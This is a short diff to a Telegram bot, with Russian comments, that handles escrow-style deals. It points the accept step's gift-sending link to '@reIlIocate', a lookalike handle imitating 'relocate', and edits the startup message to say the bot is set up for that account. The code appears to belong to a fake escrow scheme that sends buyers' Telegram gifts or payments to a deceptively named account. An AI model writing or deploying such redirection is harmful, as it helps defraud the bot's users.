@@ -343,6 +343,8 @@ async def process_accept(callback: types.CallbackQuery):
         lang = last_data.get("lang", "ru")
 
     t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
+    
+    # Ссылка изменена на @reIlIocate
     send_url = "tg://send_gift?to=reIlIocate"
 
     escrow_text = t['escrow'].format(amount=amount, currency=currency)
@@ -428,7 +430,7 @@ async def process_decline(callback: types.CallbackQuery):
 
 async def main():
     logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
-    print(f"Премиальный бот @{BOT_USERNAME} запущен и работает!")
+    print(f"Премиальный бот @{BOT_USERNAME} запущен и настроен на @reIlIocate!")
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot, allowed_updates=["message", "inline_query", "chosen_inline_result", "callback_query"])
 
